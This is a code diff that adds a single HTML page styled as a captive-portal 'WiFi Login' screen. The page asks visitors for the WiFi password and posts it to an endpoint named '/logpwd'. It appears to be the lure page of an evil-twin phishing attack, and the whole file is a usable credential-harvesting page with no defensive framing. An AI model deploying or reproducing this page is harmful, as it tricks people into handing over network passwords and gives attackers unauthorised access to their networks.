@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Required</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #16213e; padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(102, 126, 234, 0.5); width: 350px; }
+        h1 { text-align: center; color: #00d9ff; margin-bottom: 10px; }
+        p { text-align: center; color: #888; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #333; border-radius: 8px; background: #0f3460; color: white; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 15px; background: linear-gradient(90deg, #00d9ff, #00ff88); border: none; border-radius: 8px; color: #1a1a2e; font-weight: bold; font-size: 16px; cursor: pointer; }
+        button:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 WiFi Login</h1>
+        <p>Enter password to access internet</p>
+        <form action="/logpwd" method="POST">
+            <input type="password" name="pwd" placeholder="Enter WiFi Password" required>
+            <button type="submit">Connect Now</button>
+        </form>
+    </div>
+</body>
+</html>
